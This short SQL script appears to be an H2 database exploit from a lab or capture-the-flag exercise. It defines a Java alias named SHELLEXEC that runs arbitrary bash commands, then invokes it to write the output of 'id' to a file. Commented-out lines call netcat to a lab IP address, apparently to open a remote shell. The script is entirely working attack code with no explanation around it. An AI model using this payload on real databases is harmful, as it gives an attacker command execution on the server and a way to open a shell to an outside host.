CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\A");
    return s.hasNext() ? s.next() : "";  }
$$;
-- CALL SHELLEXEC('nc ')
-- CALL SHELLEXEC('nc 10.10.14.58 2121')
CALL SHELLEXEC('id > exploited.txt')
